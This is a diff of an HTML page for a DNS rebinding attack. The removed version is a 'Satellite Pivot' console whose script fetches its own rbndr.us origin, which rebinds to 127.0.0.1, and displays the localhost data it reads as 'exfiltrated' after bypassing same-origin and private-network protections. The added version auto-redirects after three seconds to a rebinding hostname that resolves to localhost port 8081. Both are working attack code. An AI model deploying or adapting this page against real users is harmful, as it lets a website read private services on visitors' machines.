@@ -1,88 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>DNS Rebinding: Phase 1 (Data Theft)</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a0a;
-            color: #00ff41;
-            padding: 20px;
-        }
-        .console {
-            background: #000;
-            border: 1px solid #00ff41;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
-        }
-        h1 {
-            color: #fff;
-            border-bottom: 2px solid #00ff41;
-            padding-bottom: 10px;
-        }
-        .data-box {
-            background: #111;
-            border: 1px dashed #555;
-            padding: 10px;
-            margin-top: 20px;
-            color: #ccc;
-            white-space: pre-wrap;
-            height: 300px;
-            overflow-y: auto;
-        }
-        button {
-            background: #00ff41;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-right: 10px;
-        }
-        button:hover {
-            background: #00cc33;
-        }
-        .status {
-            margin-bottom: 15px;
-            font-style: italic;
-        }
-    </style>
+  <title>DNS Rebinding Test</title>
 </head>
 <body>
-    <div class="console">
-        <h1>Satellite Pivot: DNS Rebinding</h1>
-        <div id="status" class="status">Waiting for user interaction...</div>
-        <button onclick="startExfiltration()">Simulate Login (Start Attack)</button>
-        <div id="output-label" style="margin-top:20px; font-weight:bold;">Localhost Data (Exfiltrated):</div>
-        <div id="data-display" class="data-box">No data captured yet.</div>
-    </div>
-    <script>
-        const statusEl = document.getElementById('status');
-        const dataEl = document.getElementById('data-display');
-        async function startExfiltration() {
-            statusEl.innerText = "Attempting to bypass SOP/PNA protections...";
-            // This URL points to 'the same origin' (rbndr.us) but physically hits 127.0.0.1
-            const targetUrl = window.location.origin + "/";
-            try {
-                // We perform a credentialed fetch to the root of the server
-                const response = await fetch(targetUrl);
-                if (response.ok) {
-                    const text = await response.text();
-                    statusEl.innerText = "🔥 SUCCESS: SOP Bypassed. Localhost data recovered!";
-                    statusEl.style.color = "#00ff41";
-                    // Display the 'stolen' local directory listing/content
-                    dataEl.innerText = text;
-                } else {
-                    statusEl.innerText = `Connected, but server returned error ${response.status}`;
-                }
-            } catch (err) {
-                statusEl.innerText = "Error: " + err.message + " (PNA block or DNS not flipped yet)";
-                statusEl.style.color = "#ff4100";
-                console.error(err);
-            }
-        }
-    </script>
+  <h2>Preparing connection...</h2>
+
+  <script>
+    setTimeout(function() {
+      window.location.href = "http://7f000001.00000000.rbndr.us:8081/";
+    }, 3000); // 3-second delay
+  </script>
+
 </body>
 </html>
